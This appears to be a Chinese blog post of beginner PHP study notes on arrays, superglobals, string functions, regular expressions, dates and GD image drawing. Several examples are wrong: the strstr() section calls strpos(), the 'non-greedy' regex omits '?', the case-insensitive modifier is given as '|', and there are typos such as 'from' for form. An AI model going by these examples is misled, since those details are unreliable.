<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数组的遍历</span><br><span class="line">	遍历:每个都经历一遍</span><br><span class="line">	1) for循环</span><br><span class="line">		用的少，因为有缺陷，不能用于关联数组进行遍历</span><br><span class="line">	2) foreach语句来实现遍历数组的目的，比较常用，专门用来遍历数组的</span><br><span class="line">		foreach(数组变量名 as 变量1)&#123;</span><br><span class="line">			每次循环执行的语句</span><br><span class="line">			变量1代表当前正在经历的数据</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">不管是关联数组还是一维数组二维数组，都可以输出</span><br><span class="line">		实例:</span><br><span class="line">			$arr1 &#x3D; array(</span><br><span class="line">            &#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;,</span><br><span class="line">            &#39;num&#39;&#x3D;&gt;10</span><br><span class="line">            );</span><br><span class="line">            foreach($arr1 as $value)&#123;</span><br><span class="line">                echo $value;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">如果你想要的知道索引值</span><br><span class="line">如果想要知道索引值必须加&#x3D;&gt;符号，前面的变量是索引值，后面的变量是执行的数据</span><br><span class="line">	$arr1 &#x3D; array(</span><br><span class="line">    &#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;,</span><br><span class="line">   	&#39;num&#39;&#x3D;&gt;10</span><br><span class="line">     );</span><br><span class="line">     foreach($arr1 as $w&#x3D;&gt;$value)&#123;</span><br><span class="line">        echo $w,$value.&#39;&lt;br &#x2F;&gt;&#39;;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">预定义超全局数组变量</span><br><span class="line">	已经定义好了(存在)的变量(存放的数据的类型是数组 )</span><br><span class="line">	超全局:超级全局变量，作用域(有效区域)全局的，并不需要global来定义</span><br><span class="line">	</span><br><span class="line">	传递数据(提供数据)给服务器端主要的两种方式</span><br><span class="line">	1.get方式</span><br><span class="line">		比如:</span><br><span class="line">										&#x2F;&#x2F;其中&amp;表示后面可以追加多个值		</span><br><span class="line">										?id&#x3D;10&amp;name&#x3D;SunWuKong</span><br><span class="line">			http:&#x2F;&#x2F;localhost&#x2F;demo2&#x2F;1.php?参数名&#x3D;参数值</span><br><span class="line">			在服务器端(请求的PHP文件这边)可以通过$_GET来获取到</span><br><span class="line">			$_GET就是在服务端的参数名字，而在URL中的索引值对应的数据就是参数值</span><br><span class="line">		在服务端使用$_GET:			</span><br><span class="line">					var_dump($_GET);</span><br><span class="line">	$_GET优缺点</span><br><span class="line">    	优点:</span><br><span class="line">    		实行方便，直接在URL中使用</span><br><span class="line">    	缺点:</span><br><span class="line">    		正因为实行方便，直接写在URL中，所以这反而不安全，而且在URL中只能用英文</span><br><span class="line">    		</span><br><span class="line">	2.post方式</span><br><span class="line">	$_POST</span><br><span class="line">	</span><br><span class="line">	&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;预定义全局变量&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">	&lt;from method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">		姓名:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&#39;username&#39; &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">		性别:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&#39;sex&#39; &#x2F;&gt;&lt;br &#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;from&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">处理数组的相关函数</span><br><span class="line">这只是其中一部分，通过学习下面一部分，来了解如何使用处理数组的相关函数</span><br><span class="line">	1) array_count_values	&#x2F;&#x2F; 统计数组中所有的值出现的次数</span><br><span class="line">			array array_count_values(array $input)</span><br><span class="line">				实例:</span><br><span class="line">					$array &#x3D; array(1,&quot;hello&quot;,1,&quot;world&quot;,&quot;hello&quot;);</span><br><span class="line">					print_r(array_count_values ($array));</span><br><span class="line">					print_r($array) &#x2F;&#x2F; 原来的数组不会受到任何影响</span><br><span class="line">				结果:</span><br><span class="line">				&#x2F;&#x2F; 1 在数组中出现了2次，hello出现了2 次，world出现了1次</span><br><span class="line">					Array ( [1]&#x3D;&gt;2 [hello]&#x3D;&gt;2 [world]&#x3D;&gt;1 )</span><br><span class="line"></span><br><span class="line">	2) array_key_exists	&#x2F;&#x2F; 查看给定的键值或索引是否存在与数组中</span><br><span class="line">				实例:</span><br><span class="line">                    $search_array &#x3D; array(&#39;first&#39; &#x3D;&gt; 1 , &#39;second&#39; &#x3D;&gt; 4);</span><br><span class="line">                    if(array_key_exists(&#39;first&#39;,$search_array))&#123;</span><br><span class="line">                            echo &quot;The &#39;first&#39; element is in the array&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                结果:</span><br><span class="line">                	The &#39;first&#39; element is in the array</span><br><span class="line">		</span><br><span class="line">	3) array_search		&#x2F;&#x2F;在数组中搜索给定的值，如果成功则返回相应的键名</span><br><span class="line">		   $array &#x3D; array(0 &#x3D;&gt; &#39;blue&#39;, 1 &#x3D;&gt; &#39;red&#39;,2 &#x3D;&gt;&#39;green&#39;,3&#x3D;&gt;&#39;red&#39;,4&#x3D;&gt;15);</span><br><span class="line">		   &#x2F;&#x2F; 可以加入true来判断中&#39;15&#39;有没有,虽然上面有15但是类型不同,一个int一个str</span><br><span class="line">		   &#x2F;&#x2F; 如果不加true不比较类型，只比较大小是够相等，返回了键4</span><br><span class="line">           var_dump(array_search(&#39;15&#39;,$array,true)); &#x2F;&#x2F; key &#x3D; 2  返回false,类型不同</span><br><span class="line"> 		   var_dump(array_search(&#39;red&#39;,$array));	 &#x2F;&#x2F; key &#x3D; 1</span><br><span class="line"></span><br><span class="line">	4) count	&#x2F;&#x2F; 计算数组中的单元数目或对象中的属性个数</span><br><span class="line">		&#x2F;&#x2F; $array变量中有两个值</span><br><span class="line">		$array &#x3D; array(0 &#x3D;&gt; &#39;blue&#39;, 1 &#x3D;&gt; &#39;red&#39;);</span><br><span class="line">		var_dump(count($array));	&#x2F;&#x2F; 返回结果是 int(2)</span><br><span class="line">		</span><br><span class="line">	5) in_array		&#x2F;&#x2F; 检查数组中是否存在某个值</span><br><span class="line">		$os &#x3D; array(&#39;Mac&#39;,&#39;NT&#39;,&#39;Irix&#39;,&#39;Linux&#39;);</span><br><span class="line">		var_dump(in_array(&#39;Mac&#39;,$os));</span><br><span class="line"></span><br><span class="line">	6) list		&#x2F;&#x2F; 把数组中的值赋给一些变量</span><br><span class="line">		list()仅能用于数字索引的数组</span><br><span class="line">		格式:</span><br><span class="line">			$arr&#x3D;array(索引值);</span><br><span class="line">            list(变量名)&#x3D;$arr;</span><br><span class="line">            echo 变量名 ;</span><br><span class="line">		</span><br><span class="line">		实例:</span><br><span class="line">            $arr&#x3D;array(60,70,80);</span><br><span class="line">            list($Sun,$Liu,$Zhang)&#x3D;$arr;</span><br><span class="line">            echo $Zhang;	&#x2F;&#x2F; 结果是 80</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	7) asort	&#x2F;&#x2F; 对数组进行排序保持索引关系</span><br><span class="line">		$frults &#x3D; array(&quot;c&quot;&#x3D;&gt;60,&quot;a&quot;&#x3D;&gt;90,&quot;b&quot;&#x3D;&gt;30);</span><br><span class="line">		asort($frults);</span><br><span class="line">		print_r($frults);</span><br><span class="line">		直接对数组里面的数据进行排序</span><br></pre></td></tr></table></figure>

<h4 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一、去除空格或其他字符</span><br><span class="line">1、trim()函数</span><br><span class="line">	去除空格</span><br><span class="line">		$str &#x3D;&#39;     abc      &#39;;</span><br><span class="line">        var_dump($str);</span><br><span class="line">        var_dump(trim($str));</span><br><span class="line">    去除其他空格</span><br><span class="line">    	$str &#x3D;&#39;aabca&#39;;</span><br><span class="line">        var_dump($str);</span><br><span class="line">        var_dump(trim($str,&#39;a&#39;));</span><br><span class="line">2、ltrim()	去除左边字符</span><br><span class="line">3、rtrim()	去除右边字符</span><br><span class="line"></span><br><span class="line">二、大小写转换函数</span><br><span class="line">1、strtoupper()</span><br><span class="line">	将字母大写</span><br><span class="line">		$a &#x3D; &#39;test&#39;;</span><br><span class="line">        var_dump($a);</span><br><span class="line">        var_dump(strtoupper($a));</span><br><span class="line">2、strtolower()</span><br><span class="line">	方法同上</span><br><span class="line">	</span><br><span class="line">三、字符串查找函数</span><br><span class="line">1、substr_count()</span><br><span class="line">	计算字符串出现的次数</span><br><span class="line">		$str&#x3D;&#39;teteastetasd&#39;;</span><br><span class="line">		var_dump(substr_count($str,&#39;te&#39;));	&#x2F;&#x2F;可以再查找的字符串后面加上起始值和结束值</span><br><span class="line">2、strpos()</span><br><span class="line">	查找字符串首次出现的位置</span><br><span class="line">		$str&#x3D;&#39;teteastetasd&#39;;</span><br><span class="line">		var_dump(strpos($str,&#39;as&#39;));	&#x2F;&#x2F;返会结果是 4</span><br><span class="line">3、strstr()</span><br><span class="line">	返回字符串首次出现的位置并将后面的字符全部输出</span><br><span class="line">		$str&#x3D;&#39;teteastetasd&#39;;</span><br><span class="line">		var_dump(strpos($str,&#39;as&#39;));	&#x2F;&#x2F;返回结果 astetasd</span><br><span class="line">四、字符串替换函数 </span><br><span class="line">1、str_replace</span><br><span class="line">	字符串替换</span><br><span class="line">		替换多个字符</span><br><span class="line">		$str&#x3D;&#39;teteastetasd&#39;;</span><br><span class="line">		$str1&#x3D;str_replace(array(&#39;e&#39;,&#39;a&#39;,&#39;s&#39;),array(&#39;E&#39;,&#39;A&#39;,&#39;S&#39;),$str);</span><br><span class="line">		var_dump($str1);</span><br><span class="line">五、与html标签相关的函数</span><br><span class="line">1、htmlspecialchars()</span><br><span class="line">	$str&#x3D;&lt;&lt;&lt;START</span><br><span class="line">    &lt;p style&#x3D;&quot;color:red;fonts-size:28px;&quot;&gt;单位确定为取得完全&lt;&#x2F;p&gt;</span><br><span class="line">    START;</span><br><span class="line">    echo $str;</span><br><span class="line">    echo &quot;\n&quot;;</span><br><span class="line">    echo htmlspecialchars($str);</span><br><span class="line">2、strip_tags()</span><br><span class="line">	从字符串中去除HTML和PHP标记</span><br><span class="line">		$str&#x3D;&lt;&lt;&lt;START</span><br><span class="line">        &lt;p style&#x3D;&quot;color:red;fonts-size:28px;&quot;&gt;单位确定为取得完全&lt;&#x2F;p&gt;</span><br><span class="line">        START;</span><br><span class="line">        echo $str;</span><br><span class="line">        echo &quot;\n&quot;;</span><br><span class="line">        echo strip_tags($str);</span><br><span class="line">六、字符串截取函数</span><br><span class="line">1、substr()</span><br><span class="line">	截取函数</span><br><span class="line">		$str&#x3D;&#39;teaeatewfsdf&#39;;</span><br><span class="line">		echo substr($str,1);	&#x2F;&#x2F;将t给截取了</span><br><span class="line">七、字符串分割函数</span><br><span class="line">1、explode()</span><br><span class="line">	用其中的一个字符来分割</span><br><span class="line">		$str&#x3D;&#39;test,test1,test2,test3&#39;;</span><br><span class="line">		var_dump(explode(&#39;,&#39;,$str));</span><br><span class="line">2、str_split() </span><br><span class="line">	将一个字符串转换为数组</span><br><span class="line">		$str &#x3D; &#39;Hello&#39;;</span><br><span class="line">		var_dump(str_split($str));	&#x2F;&#x2F;输出结果是 数组格式</span><br><span class="line">	将字符中长度是3的输出，这里输出的结果就是hel   lo是因为字符长度不足，输出出来的。</span><br><span class="line">		$str &#x3D; &#39;Hello&#39;;</span><br><span class="line">		var_dump(str_split($str,3));</span><br></pre></td></tr></table></figure>

<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一、正则表达式语法规则</span><br><span class="line">	正则表达式描述了一类字符串的特征，通过这个特征与特定的函数配合，对其他的字符串进行匹配、查找、替换及分割操作！</span><br><span class="line">	</span><br><span class="line">	这类字符串的特征是由一个或多个</span><br><span class="line">		1、普通字符(比如a到z)、</span><br><span class="line">		2、元字符(有特殊功能的字符比如*、+、?等),</span><br><span class="line">		组成的一个字符串！</span><br><span class="line">		例如&#39;&#x2F;a&#x2F;&#39;,a就是普通字符，&#x2F;是定界符(表示正则表达式开始或结束)。</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">preg_match_all()&#x2F;&#x2F;按指定的正则表达式，在给定的字符串中进行搜索，匹配到复合特征的部分取出来</span><br><span class="line">&#x2F;&#x2F; 用正则表达式指定一个特征</span><br><span class="line">	$pattern&#x3D;&#39;&#x2F;test&#x2F;&#39;;</span><br><span class="line">&#x2F;&#x2F; 新建一个变量，里面存入字符串，上面的特种会查找当前字符串有没有相同的，有则输出</span><br><span class="line">    $str&#x3D;&#39;testidhiashtestewofoitest&#39;;</span><br><span class="line">&#x2F;&#x2F; 第一个变量就是指定得正则，第二个变量就是要查找的字符串，第三个变量是将你匹配的字符串查找出来，并且赋值给第三个变量</span><br><span class="line">    preg_match_all($pattern,$str,$varr);</span><br><span class="line">    var_dump(preg_match_all($pattern,$str,$varr));</span><br><span class="line">    var_dump($varr);</span><br><span class="line"></span><br><span class="line">二、定界符</span><br><span class="line">	我们一般用正斜杠&#x2F;作为定界符的字符</span><br><span class="line">	除了字母、数字、和正斜线以外的字符都可以作为定界符，比如</span><br><span class="line">	#</span><br><span class="line">	!</span><br><span class="line">	&#123;&#125;</span><br><span class="line">	|</span><br><span class="line">	都可以</span><br><span class="line">	定界符放在正则表达式起始位置，前后一致！</span><br><span class="line">	</span><br><span class="line">三、普通字符</span><br><span class="line">	比如:a-z、A-Z、0-9、双引号、单引号，他们没有特殊的含义</span><br><span class="line">	</span><br><span class="line">	&#x2F;*</span><br><span class="line">	元字符</span><br><span class="line">	\d  代表0-9之中的任意一个字符，	注意是 一个 字符，如果两个的话就不行了</span><br><span class="line">	\D  匹配除了0-9之外的任意一个字符，注意是 一个 字符，如果两个的话就不行了</span><br><span class="line">	\s  匹配任意一个空白字符，比如换页符、换行符、回车符、制表符、垂直制表符</span><br><span class="line">	\S	匹配除了空白字符以外的任何一个字符</span><br><span class="line">	\w	匹配任意一个数字或字母或下划线</span><br><span class="line">	\W	匹配除数字、字母、下划线以外的任意一个字符</span><br><span class="line">	.	匹配除换行符以外的任意一个字符</span><br><span class="line">	*	匹配0次、或者1次、或多次</span><br><span class="line">	+	匹配1次或多次其前面的字符</span><br><span class="line">	?	匹配0次或1次其前面的字符</span><br><span class="line">	&#123;n&#125; 表示其前面字符恰好出现n次</span><br><span class="line">	&#123;n,&#125;	表示前面字符出现不少于n次</span><br><span class="line">	&#123;n,m&#125;	表示前面字符至少出现n次，最多出现m次</span><br><span class="line">	^或\A	匹配字符串开始位置</span><br><span class="line">	$或者\Z	匹配字符串的结束位置</span><br><span class="line">	|	匹配两个或多个模式</span><br><span class="line">	[]	匹配方括号中的任意一个字符</span><br><span class="line">	[^]	匹配除方括号中字符以外的任意一个字符</span><br><span class="line">	()	将括号中作为一个整体以便将其中的内容获取到</span><br><span class="line">		在我们的正则表达式中，可以使用圆括号来将某一段括起来，在圆括号的后面部分我们可以使用</span><br><span class="line">		\\数字  来代表圆括号部分所匹配的内容</span><br><span class="line">	&#x2F;*</span><br><span class="line">		()将括号中作为一个整体以便将其中的内容获取到</span><br><span class="line">			在我们的正则表达式中 可以使用圆括号来将某一段括起来，在圆括号的后面部分，我们可					以使用</span><br><span class="line">                    \\数字 来代表圆括号部分所匹配到的内容</span><br><span class="line">        *&#x2F;</span><br><span class="line">        $pattern&#x3D;&#39;&#x2F;t(e)st\\1&#x2F;&#39;;&#39;\\1就代表第一个圆括号部分所匹配到的内容&#39;</span><br><span class="line">        &#x2F;&#x2F; 在()里面，匹配到什么\\1就要跟什么，不能和()的</span><br><span class="line">        $str&#x3D;&#39;      teste           &#39;;</span><br><span class="line">        var_dump(preg_match_all($pattern,$str,$varr));</span><br><span class="line">        var_dump($varr);</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">    *&#x2F;</span><br><span class="line">    &#x2F;&#x2F; 在搜索的时候因为你是在te和st中间插入的\d所以只能在$str里面找te到st中间有数字的</span><br><span class="line">    &#x2F;&#x2F; 例如: te0-9st只要其中一个数字都可以，但是如果tes0-9t,在这个位置或者以外的位置,、</span><br><span class="line">    		将搜索不到。</span><br><span class="line">    $pattern&#x3D;&#39;&#x2F;te\dst&#x2F;&#39;;</span><br><span class="line">    $str&#x3D;&#39;testidhtesteite1st&#39;;</span><br><span class="line">    var_dump(preg_match_all($pattern,$str,$varr));</span><br><span class="line">    var_dump($varr);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;除了0-9之外都能匹配</span><br><span class="line">    $pattern&#x3D;&#39;&#x2F;te\Dst&#x2F;&#39;;</span><br><span class="line">    $str&#x3D;&#39;testidhteTsteite1st&#39;;</span><br><span class="line">    var_dump(preg_match_all($pattern,$str,$varr));</span><br><span class="line">    var_dump($varr);</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582381577238.png" alt="1582519884665"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582524376623.png" alt="1582522025507"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">	.和*匹配</span><br><span class="line">	.*配合使用默认情况下是 贪婪匹配(尽可能多的匹配)</span><br><span class="line">*&#x2F;</span><br><span class="line">$pattern&#x3D;&#39;&#x2F;te.*st&#x2F;&#39;;</span><br><span class="line">   $str&#x3D;&#39;testidhteTsteite1st&#39;;</span><br><span class="line">   var_dump(preg_match_all($pattern,$str,$varr));</span><br><span class="line">   var_dump($varr);</span><br><span class="line">   </span><br><span class="line">   &#x2F;*</span><br><span class="line">	.*后面加上一个?可以解决贪婪匹配问题，非贪婪匹配</span><br><span class="line">*&#x2F;</span><br><span class="line">$pattern&#x3D;&#39;&#x2F;te.*st&#x2F;&#39;;</span><br><span class="line">   $str&#x3D;&#39;testidhteTsteite1st&#39;;</span><br><span class="line">   var_dump(preg_match_all($pattern,$str,$varr));</span><br><span class="line">   var_dump($varr);</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582633658272.png" alt="1582524376623"></p>
<h4 id="模式修正符"><a href="#模式修正符" class="headerlink" title="模式修正符"></a>模式修正符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">模式修正符是在正则表达式的定界符之后使用的，可以调整正则表达式的解释，扩展正则表达式在匹配、替换等操作时的某些功能，增强正则表达式的处理能力</span><br><span class="line">|	在和模式进行匹配时不区分大小写</span><br><span class="line">m	多行匹配，如果目标字符串中没有&quot;\n&quot;字符，或者正则表达式中没有出现^或$，设置这个修饰符不产			生任何影响</span><br><span class="line">s	如果设定了此修正符，那么将匹配所有的字符包括换行符</span><br><span class="line">U	禁止贪婪匹配</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">模式修正符他是可以搭配使用的，可以使用多个</span><br><span class="line">$pattern&#x3D;&#39;&#x2F;test&#x2F;i&#39;;</span><br><span class="line">$str &#x3D; &#39;    test  TEST    Test    TeSt    &#39;;</span><br><span class="line">var_dump(preg_match_all($pattern,$str,$arr));</span><br><span class="line">var_dump($arr);</span><br></pre></td></tr></table></figure>

<h4 id="与正则表达式配合的函数"><a href="#与正则表达式配合的函数" class="headerlink" title="与正则表达式配合的函数"></a>与正则表达式配合的函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">最常用的匹配函数</span><br><span class="line">    1、preg_match()</span><br><span class="line">    	&#x2F;&#x2F;执行一个正则表达式匹配，返回值0次或者1次</span><br><span class="line">    	参数说明：</span><br><span class="line">		第一个参数：正则表达式</span><br><span class="line">		第二个参数：目标字符串</span><br><span class="line">		第三个参数：放一个变量，执行完成之后，里面会有匹配到的部分以及等等一些数据。</span><br><span class="line">		第四个参数：可以传PREG_OFFSET_CAPTURE进入(那么第三个参数那个变量里面的数据就会有匹配到的部分的偏移值)，默认是0</span><br><span class="line">		第五个参数：可以传一个值，来表示从目标字符串的哪个位置开始匹配（单位是字节）。</span><br><span class="line">		$pattern &#x3D; &#39;&#x2F;t(.*?)st&#x2F;&#39;;</span><br><span class="line">        $str &#x3D; &#39;     test   tadasst        &#39;;</span><br><span class="line">        if(preg_match($pattern,$str))&#123;</span><br><span class="line">            echo &#39;找到了&#39;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#39;没找到&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;var_dump($arr);</span><br><span class="line"></span><br><span class="line">    2、preg_match_all()</span><br><span class="line">    	&#x2F;&#x2F; 按指定的正则表达式，在给定的字符串中进行搜索，匹配到复合特征的部分取出来</span><br><span class="line">    		$pattern &#x3D; &#39;&#x2F;t(.*?)st&#x2F;&#39;;</span><br><span class="line">            $str &#x3D; &#39;     test   tadasst        &#39;;</span><br><span class="line">            var_dump(preg_match_all($pattern,$str,$arr));</span><br><span class="line">            var_dump($arr);</span><br><span class="line">            	结果:</span><br><span class="line">            		array (size&#x3D;2)</span><br><span class="line">                      0 &#x3D;&gt; </span><br><span class="line">                        array (size&#x3D;2)</span><br><span class="line">                          0 &#x3D;&gt; string &#39;test&#39; (length&#x3D;4)</span><br><span class="line">                          1 &#x3D;&gt; string &#39;tadasst&#39; (length&#x3D;7)</span><br><span class="line">                      1 &#x3D;&gt; </span><br><span class="line">                        array (size&#x3D;2)</span><br><span class="line">                          0 &#x3D;&gt; string &#39;e&#39; (length&#x3D;1)</span><br><span class="line">                          1 &#x3D;&gt; string &#39;adas&#39; (length&#x3D;4)</span><br><span class="line">    3、preg_replace()</span><br><span class="line">    	&#x2F;&#x2F;执行一个正则表达式的搜索和替换</span><br><span class="line">    	参数说明: </span><br><span class="line">    		第一个参数:正则表达式</span><br><span class="line">    		第二个参数:要替换成的字符串</span><br><span class="line">    		第三个参数:目标字符串</span><br><span class="line">    		第四个参数:默认是-1，就是替换所有符合特征部分的</span><br><span class="line">    	$pattern &#x3D; &#39;&#x2F;(.*?)&#x2F;&#39;;</span><br><span class="line">        $str &#x3D; &#39;\\1&#39;;</span><br><span class="line">        $str1 &#x3D; &#39;saiudhdstest&#39;;</span><br><span class="line">        var_dump(preg_replace($pattern,$str,$str1));</span><br><span class="line">        var_dump($str1);</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582945264007.png" alt="1582633658272"></p>
<h4 id="日期与时间"><a href="#日期与时间" class="headerlink" title="日期与时间"></a>日期与时间</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一、设置时区</span><br><span class="line">	默认的时区是UTC</span><br><span class="line">	date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);</span><br><span class="line">二、获取当前Unix时间戳</span><br><span class="line">	Unix时间戳</span><br><span class="line">	从Unix纪元(格林威治时间1970年1月1日00时00分00秒)开始到当前的秒数</span><br><span class="line">	time();</span><br><span class="line">三、获取指定时间的Unix时间戳</span><br><span class="line">	mktime();</span><br><span class="line">	&#x2F;&#x2F;顺序是，时,分,秒,月,日,年</span><br><span class="line">	var_dump(mktime(0,0,0,10,1,2015));</span><br><span class="line">	还可以</span><br><span class="line">	$nowtime&#x3D;time();&#x2F;&#x2F;获取Unix时间戳</span><br><span class="line">    &#x2F;&#x2F;顺序是，时,分,秒,月,日,年</span><br><span class="line">    $mktime1&#x3D;mktime(0,0,0,10,1,2020);</span><br><span class="line">    echo &#39;距离2020年国庆还有&#39;.(($mktime1-$nowtime)&#x2F;60&#x2F;60&#x2F;24).&#39;天&#39;;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">四、从Unix时间戳取得时间日期信息</span><br><span class="line">&#x2F;&#x2F;格式化一个本地时间&#x2F;日期</span><br><span class="line">	date();</span><br><span class="line">	第一个参数：必填，自己定义时间日期格式</span><br><span class="line">	var_dump(date(&#39;Y-m-d G:i:s&#39;));</span><br><span class="line"></span><br><span class="line">五、获取Unix时间戳和微秒数</span><br><span class="line">&#x2F;&#x2F;返回当前Unix时间戳和微秒数 </span><br><span class="line">	microtime();</span><br><span class="line">	var_dump(microtime());</span><br><span class="line">	var_dump(microtime(true));</span><br><span class="line">	</span><br><span class="line">	可以用于查看程序运行时间</span><br><span class="line">	例如for循环</span><br><span class="line">	&#x2F;&#x2F;round();函数是显示小数点后几位</span><br><span class="line">	$start&#x3D;microtime(true);</span><br><span class="line">    for ($i&#x3D;0;$i&lt;100000;$i++)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    $end&#x3D;microtime(true);</span><br><span class="line">    echo &#39;循环用了&#39;.round(($end-$start),3).&#39;秒&#39;;</span><br></pre></td></tr></table></figure>

<h4 id="图像处理"><a href="#图像处理" class="headerlink" title="图像处理"></a>图像处理</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">创建一个图像应该完成如下所示的四个基本步骤</span><br><span class="line">1、创建图像</span><br><span class="line">	所有的绘图设计都需要在一个图像上完成，以后的操作都将基于这个图像</span><br><span class="line">2、绘制图像</span><br><span class="line">	图像创建完成以后，就可以通过这个图像资源，使用各种画像函数设置图像的颜色、填充画布、画		点、线段、各种几何图形，以及向图像的添加文本等</span><br><span class="line">3、输出图像</span><br><span class="line">	完成整个图像的绘制之后，需要将图像以某个格式保存到服务器的文件中，或者将图像直接输出到浏	览器上显示给用户。但在图像输出之前一定要是用header()函数发送Content-type通知浏览器，	这次发送的是图片不是文本</span><br><span class="line">4、释放资源</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一、创建图像</span><br><span class="line">imagecreatetruecolor();	创建一个真彩色图像</span><br><span class="line">	实例:</span><br><span class="line">		$img &#x3D; imagecreatetruecolor(200,200);</span><br><span class="line">二、绘制图像</span><br><span class="line">	$color1&#x3D;imagecolorallocate($img,50,120,200);&#x2F;&#x2F;分配颜色</span><br><span class="line">	$color2&#x3D;imagecolorallocate($img,46,219,50);</span><br><span class="line"></span><br><span class="line">三、输出图像</span><br><span class="line">	header函数注意点</span><br><span class="line">	在header函数之前不能输出任何内容，包括空格，空字符串等</span><br><span class="line">四、释放资源</span><br><span class="line">imagedestroy()	&#x2F;&#x2F;销毁图片</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">实例整体:</span><br><span class="line">&#x2F;&#x2F;不使用header浏览器不知道你要输出的什么会乱码，</span><br><span class="line">&#x2F;&#x2F;NetWork里面显示,Content-Type:test&#x2F;html</span><br><span class="line">&#x2F;&#x2F;使用header更改格式，底下用的imagejpeg所以更改为image传输为jpeg</span><br><span class="line"></span><br><span class="line">	header(&#39;Content-Type:image&#x2F;jpeg&#39;);</span><br><span class="line">    $img &#x3D; imagecreatetruecolor(200,200);&#x2F;&#x2F;创建一个长和高都为200像素的真彩色图像</span><br><span class="line">    $color1&#x3D;imagecolorallocate($img,50,120,200);&#x2F;&#x2F;分配颜色</span><br><span class="line">    $color2&#x3D;imagecolorallocate($img,46,219,50);</span><br><span class="line">    imagefill($img,0,0,$color2);</span><br><span class="line">    imagejpeg($img);</span><br><span class="line"></span><br><span class="line">另存为图片</span><br><span class="line">&#x2F;&#x2F;将之前的image&#x2F;jpeg改为原本的text&#x2F;html</span><br><span class="line">    header(&#39;Content-Type:text&#x2F;html charset&#x3D;UFT-8&#39;);</span><br><span class="line">    $img &#x3D; imagecreatetruecolor(200,200);&#x2F;&#x2F;创建一个长和高都为200像素的真彩色图像</span><br><span class="line">    $color1&#x3D;imagecolorallocate($img,50,120,200);&#x2F;&#x2F;分配颜色</span><br><span class="line">    $color2&#x3D;imagecolorallocate($img,46,219,50);</span><br><span class="line">    imagefill($img,0,0,$color2);</span><br><span class="line">&#x2F;&#x2F;在这里加一个相对路径就是要保存的位置</span><br><span class="line">    if(imagejpeg($img,&#39;images&#x2F;sunwukong.jpeg&#39;))&#123;	&#x2F;&#x2F;保存图片</span><br><span class="line">        echo &#39;保存成功&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    imagedestroy($img);</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582710213923.png" alt="1582710213923"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">绘制图像</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1582710241411.png" alt="1582710241411"></p>
